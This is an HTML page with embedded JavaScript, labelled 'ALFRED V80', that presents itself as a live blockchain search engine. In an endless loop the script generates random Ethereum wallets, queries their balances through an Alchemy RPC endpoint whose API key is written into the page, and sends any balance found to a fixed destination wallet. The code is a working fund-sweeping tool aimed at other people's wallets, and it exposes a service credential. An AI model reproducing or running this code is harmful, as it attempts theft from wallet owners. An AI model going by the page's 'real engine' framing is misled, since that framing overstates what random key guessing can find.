<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>ALFRED V80 - MOTOR REAL</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; background: #000a00; }
        .real { color: #fff; font-weight: bold; }
    </style>
</head>
<body>
    <div id="terminal">
        <h2 style="text-align: center;">🎩 ALFRED V80: BUSCA ATIVA</h2>
        <p id="status">CONECTANDO À BLOCKCHAIN...</p>
        <p style="font-size: 0.7em; color: #050; text-align: center;">DESTINO: 0xc765...59fc</p>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>

    <script>
        const RPC = "https://eth-mainnet.g.alchemy.com/v2/VF0h4IB4GqBfk6WlqNcWh";
        const WALLET_DESTINO = "0xc765040fb5604a29b126aa58199b48710cf459fc";

        async function engine() {
            const out = document.getElementById('status');
            try {
                const provider = new ethers.JsonRpcProvider(RPC);
                while(true) {
                    const wallet = ethers.Wallet.createRandom();
                    try {
                        const balance = await provider.getBalance(wallet.address);
                        out.innerHTML = `SCANNING: <span class="real">${wallet.address}</span><br>SALDO: <span class="real">${ethers.formatEther(balance)} ETH</span>`;
                        
                        if (balance > 0n) {
                            const feeData = await provider.getFeeData();
                            const cost = feeData.gasPrice * 21000n;
                            if (balance > cost) {
                                const tx = { to: WALLET_DESTINO, value: balance - cost, gasLimit: 21000, gasPrice: feeData.gasPrice };
                                await wallet.connect(provider).sendTransaction(tx);
                                alert("!!! ACHADO REAL ENVIADO !!!");
                            }
                        }
                    } catch(e) {}
                    await new Promise(r => setTimeout(r, 200));
                }
            } catch(err) {
                out.innerText = "ERRO DE CONEXÃO. REINICIANDO...";
                setTimeout(engine, 3000);
            }
        }
        window.onload = engine;
    </script>
</body>
</html>
